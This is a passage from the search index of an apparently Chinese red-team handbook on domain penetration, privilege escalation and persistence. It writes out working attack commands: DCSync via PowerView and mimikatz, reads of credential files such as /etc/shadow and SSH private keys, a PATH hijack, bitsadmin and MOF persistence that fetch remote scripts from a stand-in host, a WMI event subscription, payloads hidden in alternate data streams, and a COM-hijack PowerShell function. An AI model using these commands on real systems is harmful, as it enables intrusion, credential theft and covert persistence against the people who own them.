History"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#adminsdholdersdprop","text":"\u5229\u7528AdminSDHolder\uff06SDProp\uff08\u91cd\u65b0\uff09\u83b7\u53d6\u57df\u7ba1\u7406\u6743\u9650","title":"AdminSDHolder\uff06SDProp"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#dcsync","text":"\u5411\u57df\u6210\u5458\u8d4b\u4e88Dcsync\u6743\u9650 Powerview.ps1 Add-DomainObjectAcl -TargetIdentity \"DC=vulntarget,DC=com\" -PrincipalIdentity test1 -Rights DCSync -Verbose \u5728\u767b\u5f55\u4e86test1\u57df\u8d26\u6237\u7684\u673a\u5668\u4e0a\u6267\u884cDcsync\u5229\u7528\u64cd\u4f5c mimikatz \"lsadump::dcsync /domain:vulntarget.com /all /csv\"","title":"Dcsync\u540e\u95e8"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#_31","text":"https://adsecurity.org/?p=2716 \u7b56\u7565\u5bf9\u8c61\u5728\u6301\u4e45\u5316\u53ca\u6a2a\u5411\u6e17\u900f\u4e2d\u7684\u5e94\u7528","title":"\u7ec4\u7b56\u7565"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#hook-passwordchangenotify","text":"http://www.vuln.cn/6812","title":"Hook PasswordChangeNotify"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#kerberoasting_1","text":"\u57df\u6e17\u900f-Kerberoasting","title":"Kerberoasting\u540e\u95e8"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#adminsdholder","text":"Backdooring AdminSDHolder for Persistence","title":"AdminSDHolder"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#delegation","text":"Unconstrained Domain Persistence \u8bc1\u4e66\u4f2a\u9020\uff1a pyForgeCert","title":"Delegation"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#11","text":"","title":"11.\u654f\u611f\u6587\u4ef6"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#windows_1","text":"\u654f\u611f\u914d\u7f6e\u6587\u4ef6 C:\\boot.ini //\u67e5\u770b\u7cfb\u7edf\u7248\u672c C:\\Windows\\System32\\inetsrv\\MetaBase.xml //IIS\u914d\u7f6e\u6587\u4ef6 C:\\Windows\\repair\\sam //\u5b58\u50a8\u7cfb\u7edf\u521d\u6b21\u5b89\u88c5\u7684\u5bc6\u7801 C:\\Program Files\\mysql\\my.ini //Mysql\u914d\u7f6e C:\\Program Files\\mysql\\data\\mysql\\user.MYD //Mysql root C:\\Windows\\php.ini //php\u914d\u7f6e\u4fe1\u606f C:\\Windows\\my.ini //Mysql\u914d\u7f6e\u4fe1\u606f C:\\Windows\\win.ini //Windows\u7cfb\u7edf\u7684\u4e00\u4e2a\u57fa\u672c\u7cfb\u7edf\u914d\u7f6e\u6587\u4ef6","title":"windows"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#linux_1","text":"\u654f\u611f\u914d\u7f6e\u6587\u4ef6 #\u5224\u65ad\u662f\u5426\u5728docker\u5bb9\u5668\u5185 /proc/1/cgroup # \u7cfb\u7edf\u7248\u672c cat /etc/issue # \u5185\u6838\u7248\u672c cat /proc/version # \u8d26\u6237\u5bc6\u7801 cat /etc/passwd cat /etc/shadow # \u73af\u5883\u53d8\u91cf cat /etc/profile # \u7cfb\u7edf\u5e94\u7528(\u547d\u4ee4) ls -lah/sbin # \u5b89\u88c5\u5e94\u7528(\u547d\u4ee4) la -lah /usr/bin # \u5f00\u673a\u81ea\u542f cat /etc/crontab # history cat ~/.bash_history cat ~/.nano_history cat ~/.atftp_history cat ~/.mysql_history cat ~/.php_history # \u7f51\u7edc\u914d\u7f6e cat /etc/resolv.conf cat /etc/networks cat /etc/network/interfaces cat /etc/sysconfig/network cat /etc/host.conf cat /etc/hosts cat /etc/dhcpd.conf # Service\u914d\u7f6e cat /etc/apache2/apache2.conf cat /etc/httpd/conf/httpd.conf cat /etc/httpd/conf/httpd2.conf cat /var/apache2/config.inc cat /usr/local/etc/nginx/nginx.conf cat /usr/local/nginx/conf/nginx.conf cat /etc/my.cnf cat /etc/mysql/my.cnf cat /var/lib/mysql/mysql/user.MYD cat /etc/mongod.conf cat /usr/local/redis/redis.conf cat /etc/redis/redis.conf # ftp cat /etc/proftpd.conf # mail cat /var/mail/root cat /var/spool/mail/root cat ~/.fetchmailrc cat /etc/procmailrc cat ~/.procmailrc cat /etc/exim/exim.cf cat /etc/postfix/main.cf cat /etc/mail/sendmail.mc cat /usr/share/sendmail/cf/cf/linux.smtp.mc cat /etc/mail/sendmail.cf # ssh cat ~/.ssh/authorized_keys cat ~/.ssh/identity.pub cat ~/.ssh/identity cat ~/.ssh/id_rsa.pub cat ~/.ssh/id_rsa cat ~/.ssh/id_dsa.pub cat ~/.ssh/id_dsa cat /etc/ssh/ssh_config cat /etc/ssh/sshd_config cat /etc/ssh/ssh_host_dsa_key.pub cat /etc/ssh/ssh_host_dsa_key cat /etc/ssh/ssh_host_rsa_key.pub cat /etc/ssh/ssh_host_rsa_key cat /etc/ssh/ssh_host_key.pub cat /etc/ssh/ssh_host_key # log ls /var/log cat /etc/httpd/logs/access_log cat /etc/httpd/logs/access.log cat /etc/httpd/logs/error_log cat /etc/httpd/logs/error.log cat /var/log/apache2/access_log cat /var/log/apache2/access.log cat /var/log/apache2/error_log cat /var/log/apache2/error.log cat /var/log/apache/access_log cat /var/log/apache/access.log cat /var/log/auth.log cat /var/log/chttp.log cat /var/log/cups/error_log cat /var/log/dpkg.log cat /var/log/faillog cat /var/log/httpd/access_log cat /var/log/httpd/access.log cat /var/log/httpd/error_log cat /var/log/httpd/error.log cat /var/log/lastlog cat /var/log/lighttpd/access.log cat /var/log/lighttpd/error.log cat /var/log/lighttpd/lighttpd.access.log cat /var/log/lighttpd/lighttpd.error.log cat /var/log/messages cat /var/log/secure cat /var/log/syslog cat /var/log/wtmp cat /var/log/xferlog cat /var/log/yum.log cat /var/run/utmp cat /var/webmin/miniserv.log cat /var/www/logs/access_log cat /var/www/logs/access.log # proc fuzz /proc/self/fd/32 /proc/self/fd/33 /proc/self/fd/34 /proc/self/fd/35 /proc/sched_debug /proc/mounts /proc/net/arp /proc/net/route /proc/net/tcp /proc/net/udp /proc/net/fib_trie /proc/version","title":"Linux"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#12_1","text":"","title":"12.\u6743\u9650\u63d0\u5347"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#windows_2","text":"","title":"Windows"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#bypass-uac","text":"","title":"bypass UAC"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#_32","text":"\u4f7f\u7528IFileOperation COM\u63a5\u53e3 \u4f7f\u7528Wusa.exe\u7684extract\u9009\u9879 \u8fdc\u7a0b\u6ce8\u5165SHELLCODE \u5230\u5080\u5121\u8fdb\u7a0b DLL\u52ab\u6301\uff0c\u52ab\u6301\u7cfb\u7edf\u7684DLL\u6587\u4ef6 eventvwr.exe and registry hijacking sdclt.exe SilentCleanup wscript.exe cmstp.exe \u4fee\u6539\u73af\u5883\u53d8\u91cf\uff0c\u52ab\u6301\u9ad8\u6743\u9650.Net\u7a0b\u5e8f \u4fee\u6539\u6ce8\u518c\u8868HKCU\\Software\\Classes\\CLSID\uff0c\u52ab\u6301\u9ad8\u6743\u9650\u7a0b\u5e8f \u76f4\u63a5\u63d0\u6743\u8fc7UAC \u2026\u2026","title":"\u5e38\u7528\u65b9\u6cd5"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#_33","text":"UACME Bypass-UAC Yamabiko \u2026","title":"\u5e38\u7528\u5de5\u5177"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#_34","text":"windows\u5185\u6838\u6f0f\u6d1e\u63d0\u6743 \u68c0\u6d4b\u7c7b: Windows-Exploit-Suggester , WinSystemHelper , wesng \u5229\u7528\u7c7b: windows-kernel-exploits \uff0c BeRoot \u670d\u52a1\u63d0\u6743 \u6570\u636e\u5e93\u670d\u52a1\uff0cftp\u670d\u52a1\u7b49 WINDOWS\u9519\u8bef\u7cfb\u7edf\u914d\u7f6e \u7cfb\u7edf\u670d\u52a1\u7684\u9519\u8bef\u6743\u9650\u914d\u7f6e\u6f0f\u6d1e \u4e0d\u5b89\u5168\u7684\u6ce8\u518c\u8868\u6743\u9650\u914d\u7f6e \u4e0d\u5b89\u5168\u7684\u6587\u4ef6/\u6587\u4ef6\u5939\u6743\u9650\u914d\u7f6e \u8ba1\u5212\u4efb\u52a1 \u4efb\u610f\u7528\u6237\u4ee5NT AUTHORITY\\SYSTEM\u6743\u9650\u5b89\u88c5msi \u63d0\u6743\u811a\u672c PowerUP , ElevateKit","title":"\u63d0\u6743"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#linux_2","text":"","title":"Linux"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#_35","text":"linux-kernel-exploits","title":"\u5185\u6838\u6ea2\u51fa\u63d0\u6743"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#_36","text":"crontab -l ls -alh /var/spool/cron ls -al /etc/ | grep cron ls -al /etc/cron* cat /etc/cron* cat /etc/at.allow cat /etc/at.deny cat /etc/cron.allow cat /etc/cron.deny cat /etc/crontab cat /etc/anacrontab cat /var/spool/cron/crontabs/root","title":"\u8ba1\u5212\u4efb\u52a1"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#suid","text":"find / -user root -perm -4000 -print 2>/dev/null find / -perm -u=s -type f 2>/dev/null find / -user root -perm -4000 -exec ls -ldb {} \\; \u5bfb\u627e\u53ef\u5229\u7528bin\uff1a https://gtfobins.github.io/","title":"SUID"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#_37","text":"cd /tmp echo \u201c/bin/sh\u201d > ps chmod 777 ps echo $PATH export PATH=/tmp:$PATH cd /home/raj/script ./shell whoami Linux\u73af\u5883\u53d8\u91cf\u63d0\u6743 - \u5148\u77e5\u793e\u533a)","title":"\u73af\u5883\u53d8\u91cf"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#_38","text":"cat /var/apache2/config.inc cat /var/lib/mysql/mysql/user.MYD cat /root/anaconda-ks.cfg","title":"\u7cfb\u7edf\u670d\u52a1\u7684\u9519\u8bef\u6743\u9650\u914d\u7f6e\u6f0f\u6d1e"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#_39","text":"cat ~/.bash_history cat ~/.nano_history cat ~/.atftp_history cat ~/.mysql_history cat ~/.php_history","title":"\u4e0d\u5b89\u5168\u7684\u6587\u4ef6/\u6587\u4ef6\u5939\u6743\u9650\u914d\u7f6e"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#_40","text":"grep -i user [filename] grep -i pass [filename] grep -C 5 \"password\" [filename] find . -name \"*.php\" -print0 | xargs -0 grep -i -n \"var $password\" # Joomla","title":"\u627e\u5b58\u50a8\u7684\u660e\u6587\u7528\u6237\u540d\uff0c\u5bc6\u7801"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#13","text":"","title":"13.\u6743\u9650\u7ef4\u6301"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#windows_3","text":"","title":"Windows"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#1_2","text":"WinlogonHack WinlogonHack \u662f\u4e00\u6b3e\u7528\u6765\u52ab\u53d6\u8fdc\u7a0b3389\u767b\u5f55\u5bc6\u7801\u7684\u5de5\u5177\uff0c\u5728 WinlogonHack \u4e4b\u524d\u6709 \u4e00\u4e2a Gina \u6728\u9a6c\u4e3b\u8981\u7528\u6765\u622a\u53d6 Windows 2000\u4e0b\u7684\u5bc6\u7801\uff0cWinlogonHack \u4e3b\u8981\u7528\u4e8e\u622a \u53d6 Windows XP \u4ee5\u53ca Windows 2003 Server\u3002 \u952e\u76d8\u8bb0\u5f55\u5668 \u5b89\u88c5\u952e\u76d8\u8bb0\u5f55\u7684\u76ee\u5730\u4e0d\u5149\u662f\u8bb0\u5f55\u672c\u673a\u5bc6\u7801\uff0c\u662f\u8bb0\u5f55\u7ba1\u7406\u5458\u4e00\u5207\u7684\u5bc6\u7801\uff0c\u6bd4\u5982\u8bf4\u4fe1\u7bb1\uff0cWEB \u7f51\u9875\u5bc6\u7801\u7b49\u7b49\uff0c\u8fd9\u6837\u4e5f\u53ef\u4ee5\u5f97\u5230\u7ba1\u7406\u5458\u7684\u5f88\u591a\u4fe1\u606f\u3002 NTPass \u83b7\u53d6\u7ba1\u7406\u5458\u53e3\u4ee4,\u4e00\u822c\u7528 gina \u65b9\u5f0f\u6765,\u4f46\u6709\u4e9b\u673a\u5668\u4e0a\u5b89\u88c5\u4e86 pcanywhere \u7b49\u8f6f\u4ef6\uff0c\u4f1a\u5bfc\u81f4\u8fdc\u7a0b\u767b\u5f55\u7684\u65f6\u5019\u51fa\u73b0\u6545\u969c\uff0c\u672c\u8f6f\u4ef6\u53ef\u5b9e\u73b0\u65e0\u969c\u788d\u622a\u53d6\u53e3\u4ee4\u3002 Linux \u4e0b openssh \u540e\u95e8 \u91cd\u65b0\u7f16\u8bd1\u8fd0\u884c\u7684sshd\u670d\u52a1\uff0c\u7528\u4e8e\u8bb0\u5f55\u7528\u6237\u7684\u767b\u9646\u5bc6\u7801\u3002","title":"1\u3001\u5bc6\u7801\u8bb0\u5f55\u5de5\u5177"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#2payload","text":"WMI : \u5b58\u50a8\uff1a $StaticClass = New-Object Management.ManagementClass('root\\cimv2', $null,$null) $StaticClass.Name = 'Win32_Command' $StaticClass.Put() $StaticClass.Properties.Add('Command' , $Payload) $StaticClass.Put() \u8bfb\u53d6: $Payload=([WmiClass] 'Win32_Command').Properties['Command'].Value \u5305\u542b\u6570\u5b57\u7b7e\u540d\u7684PE\u6587\u4ef6 \u5229\u7528\u6587\u4ef6hash\u7684\u7b97\u6cd5\u7f3a\u9677\uff0c\u5411PE\u6587\u4ef6\u4e2d\u9690\u85cfPayload\uff0c\u540c\u65f6\u4e0d\u5f71\u54cd\u8be5PE\u6587\u4ef6\u7684\u6570\u5b57\u7b7e\u540d \u7279\u6b8aADS \u2026 type putty.exe > ...:putty.exe wmic process call create c:\\test\\ads\\...:putty.exe \u7279\u6b8aCOM\u6587\u4ef6 type putty.exe > \\\\.\\C:\\test\\ads\\COM1:putty.exe wmic process call create \\\\.\\C:\\test\\ads\\COM1:putty.exe \u78c1\u76d8\u6839\u76ee\u5f55 type putty.exe >C:\\:putty.exe wmic process call create C:\\:putty.exe","title":"2\u3001\u5e38\u7528\u7684\u5b58\u50a8Payload\u4f4d\u7f6e"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#3runrunonce-keys","text":"\u7528\u6237\u7ea7 HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce \u7ba1\u7406\u5458 HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run","title":"3\u3001Run/RunOnce Keys"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#4bootexecute-key","text":"\u7531\u4e8esmss.exe\u5728Windows\u5b50\u7cfb\u7edf\u52a0\u8f7d\u4e4b\u524d\u542f\u52a8\uff0c\u56e0\u6b64\u4f1a\u8c03\u7528\u914d\u7f6e\u5b50\u7cfb\u7edf\u6765\u52a0\u8f7d\u5f53\u524d\u7684\u914d\u7f6e\u5355\u5143\uff0c\u5177\u4f53\u6ce8\u518c\u8868\u952e\u503c\u4e3a\uff1a HKLM\\SYSTEM\\CurrentControlSet\\Control\\hivelist HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet002\\Control\\Session Manager","title":"4\u3001BootExecute Key"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#5userinit-key","text":"WinLogon\u8fdb\u7a0b\u52a0\u8f7d\u7684login scripts,\u5177\u4f53\u952e\u503c\uff1a HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon","title":"5\u3001Userinit Key"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#6startup-keys","text":"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders","title":"6\u3001Startup Keys"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#7services","text":"\u521b\u5efa\u670d\u52a1 sc create [ServerName] binPath= BinaryPathName","title":"7\u3001Services"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#8browser-helper-objects","text":"\u672c\u8d28\u4e0a\u662fInternet Explorer\u542f\u52a8\u65f6\u52a0\u8f7d\u7684DLL\u6a21\u5757 HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Browser Helper Objects","title":"8\u3001Browser Helper Objects"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#9appinit_dlls","text":"\u52a0\u8f7dUser32.dll\u4f1a\u52a0\u8f7d\u7684DLL HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs","title":"9\u3001AppInit_DLLs"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#10_1","text":"HKEY_LOCAL_MACHINE\\Software\\Classes HKEY_CLASSES_ROOT","title":"10\u3001\u6587\u4ef6\u5173\u8054"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#11bitsadmin","text":"bitsadmin /create backdoor bitsadmin /addfile backdoor %comspec% %temp%\\cmd.exe bitsadmin.exe /SetNotifyCmdLine backdoor regsvr32.exe \"/u /s /i:https://host.com/calc.sct scrobj.dll\" bitsadmin /Resume backdoor","title":"11\u3001bitsadmin"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#12mof","text":"pragma namespace(\"\\\\\\\\.\\\\root\\\\subscription\") instance of __EventFilter as $EventFilter { EventNamespace = \"Root\\\\Cimv2\"; Name = \"filtP1\"; Query = \"Select * From __InstanceModificationEvent \" \"Where TargetInstance Isa \\\"Win32_LocalTime\\\" \" \"And TargetInstance.Second = 1\"; QueryLanguage = \"WQL\"; }; instance of ActiveScriptEventConsumer as $Consumer { Name = \"consP1\"; ScriptingEngine = \"JScript\"; ScriptText = \"GetObject(\\\"script:https://host.com/test\\\")\"; }; instance of __FilterToConsumerBinding { Consumer = $Consumer; Filter = $EventFilter; }; \u7ba1\u7406\u5458\u6267\u884c\uff1a mofcomp test.mof","title":"12\u3001mof"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#13wmi","text":"\u6bcf\u969460\u79d2\u6267\u884c\u4e00\u6b21notepad.exe wmic /NAMESPACE:\"\\\\root\\subscription\" PATH __EventFilter CREATE Name=\"BotFilter82\", EventNameSpace=\"root\\cimv2\",QueryLanguage=\"WQL\", Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\" wmic /NAMESPACE:\"\\\\root\\subscription\" PATH CommandLineEventConsumer CREATE Name=\"BotConsumer23\", ExecutablePath=\"C:\\Windows\\System32\\notepad.exe\",CommandLineTemplate=\"C:\\Windows\\System32\\notepad.exe\" wmic /NAMESPACE:\"\\\\root\\subscription\" PATH __FilterToConsumerBinding CREATE Filter=\"__EventFilter.Name=\\\"BotFilter82\\\"\", Consumer=\"CommandLineEventConsumer.Name=\\\"BotConsumer23\\\"\"","title":"13\u3001wmi"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#14userland-persistence-with-scheduled-tasks","text":"\u52ab\u6301\u8ba1\u5212\u4efb\u52a1UserTask\uff0c\u5728\u7cfb\u7edf\u542f\u52a8\u65f6\u52a0\u8f7ddll function Invoke-ScheduledTaskComHandlerUserTask { [CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = 'Medium')] Param ( [Parameter(Mandatory = $True)] [ValidateNotNullOrEmpty()] [String] $Command, [Switch] $Force ) $ScheduledTaskCommandPath = \"HKCU:\\Software\\Classes\\CLSID\\{58fb76b9-ac85-4e55-ac04-427593b1d060}\\InprocServer32\" if ($Force -or ((Get-ItemProperty -Path $ScheduledTaskCommandPath -Name '(default)' -ErrorAction SilentlyContinue) -eq $null)){ New-Item $ScheduledTaskCommandPath -Force | New-ItemProperty -Name '(Default)' -Value $Command -PropertyType string -Force | Out-Null }else{ Write-Verbose \"Key already exists, consider using -Force\" exit } if (Test-Path $ScheduledTaskCommandPath) { Write-Verbose \"Created registry entries to hijack the UserTask\" }else{ Write-Warning \"Failed to create registry key, exiting\" exit } } Invoke-ScheduledTaskComHandlerUserTask -Command \"C:\\test\\testmsg.dll\" -Verbose","title":"14\u3001Userland Persistence With Scheduled Tasks"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#15netsh","text":"netsh add helper c:\\test\\netshtest.dll \u540e\u95e8\u89e6\u53d1\uff1a\u6bcf\u6b21\u8c03\u7528netsh dll\u7f16\u5199: https://github.com/outflanknl/NetshHelperBeacon","title":"15\u3001Netsh"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#16shim","text":"\u5e38\u7528\u65b9\u5f0f\uff1a InjectDll RedirectShortcut RedirectEXE","title":"16\u3001Shim"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#17dll","text":"\u901a\u8fc7Rattler\u81ea\u52a8\u679a\u4e3e\u8fdb\u7a0b\uff0c\u68c0\u6d4b\u662f\u5426\u5b58\u5728\u53ef\u7528dll\u52ab\u6301\u5229\u7528\u7684\u8fdb\u7a0b \u4f7f\u7528\uff1aProcmon\u534a\u81ea\u52a8\u6d4b\u8bd5\u66f4\u7cbe\u51c6\uff0c\u5e38\u89c4\u751f\u6210\u7684dll\u4f1a\u5bfc\u81f4\u7a0b\u5e8f\u6267\u884c\u62a5\u9519\u6216\u4e2d\u65ad\uff0c\u4f7f\u7528AheadLib\u914d\u5408\u751f\u6210dll\u52ab\u6301\u5229\u7528\u6e90\u7801\u4e0d\u4f1a\u5f71\u54cd\u7a0b\u5e8f\u6267\u884c \u5de5\u5177\uff1a https://github.com/sensepost/rattler \u5de5\u5177\uff1a https://github.com/Yonsm/AheadLib dll\u52ab\u6301\u4e0d\u591a\u8bf4","title":"17\u3001DLL\u52ab\u6301"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#18doubleagent","text":"\u7f16\u5199\u81ea\u5b9a\u4e49Verifier provider DLL \u901a\u8fc7Application Verifier\u8fdb\u884c\u5b89\u88c5 \u6ce8\u5165\u5230\u76ee\u6807\u8fdb\u7a0b\u6267\u884cpayload \u6bcf\u5f53\u76ee\u6807\u8fdb\u7a0b\u542f\u52a8\uff0c\u5747\u4f1a\u6267\u884cpayload\uff0c\u76f8\u5f53\u4e8e\u4e00\u4e2a\u81ea\u542f\u52a8\u7684\u65b9\u5f0f POC : https://github.com/Cybellum/DoubleAgent","title":"18\u3001DoubleAgent"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#19waitforexe","text":"\u4e0d\u652f\u6301\u81ea\u542f\u52a8\uff0c\u4f46\u53ef\u8fdc\u7a0b\u4e3b\u52a8\u6fc0\u6d3b\uff0c\u540e\u53f0\u8fdb\u7a0b\u663e\u793a\u4e3awaitfor.exe POC : https://github.com/3gstudent/Waitfor-Persistence","title":"19\u3001waitfor.exe"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#20appdomainmanager","text":"\u9488\u5bf9.Net\u7a0b\u5e8f\uff0c\u901a\u8fc7\u4fee\u6539AppDomainManager\u80fd\u591f\u52ab\u6301.Net\u7a0b\u5e8f\u7684\u542f\u52a8\u8fc7\u7a0b\u3002\u5982\u679c\u52ab\u6301\u4e86\u7cfb\u7edf\u5e38\u89c1.Net\u7a0b\u5e8f\u5982powershell.exe\u7684\u542f\u52a8\u8fc7\u7a0b\uff0c\u5411\u5176\u6dfb\u52a0payload\uff0c\u5c31\u80fd\u5b9e\u73b0\u4e00\u79cd\u88ab\u52a8\u7684\u540e\u95e8\u89e6\u53d1\u673a\u5236","title":"20\u3001AppDomainManager"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#21office","text":"\u52ab\u6301Office\u8f6f\u4ef6\u7684\u7279\u5b9a\u529f\u80fd :\u901a\u8fc7dll\u52ab\u6301,\u5728Office\u8f6f\u4ef6\u6267\u884c\u7279\u5b9a\u529f\u80fd\u65f6\u89e6\u53d1\u540e\u95e8 \u5229\u7528VSTO\u5b9e\u73b0\u7684office\u540e\u95e8 Office\u52a0\u8f7d\u9879 Word WLL Excel XLL Excel VBA add-ins PowerPoint VBA add-ins \u53c2\u80031 \uff1a https://3gstudent.github.io/Use-Office-to-maintain-persistence \u53c2\u80032 \uff1a https://3gstudent.github.io/Office-Persistence-on-x64-operating-system","title":"21\u3001Office"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#22clr","text":"\u65e0\u9700\u7ba1\u7406\u5458\u6743\u9650\u7684\u540e\u95e8\uff0c\u5e76\u80fd\u591f\u52ab\u6301\u6240\u6709.Net\u7a0b\u5e8f POC: https://github.com/3gstudent/CLR-Injection","title":"22\u3001CLR"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#23msdtc","text":"\u5229\u7528MSDTC\u670d\u52a1\u52a0\u8f7ddll\uff0c\u5b9e\u73b0\u81ea\u542f\u52a8\uff0c\u5e76\u7ed5\u8fc7Autoruns\u5bf9\u542f\u52a8\u9879\u7684\u68c0\u6d4b \u5229\u7528\uff1a\u5411 %windir%\\system32\\\u76ee\u5f55\u6dfb\u52a0dll\u5e76\u91cd\u547d\u540d\u4e3aoci.dll","title":"23\u3001msdtc"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#24hijack-caccpropservicesclass-and-mmdeviceenumerato","text":"\u5229\u7528COM\u7ec4\u4ef6\uff0c\u4e0d\u9700\u8981\u91cd\u542f\u7cfb\u7edf\uff0c\u4e0d\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650 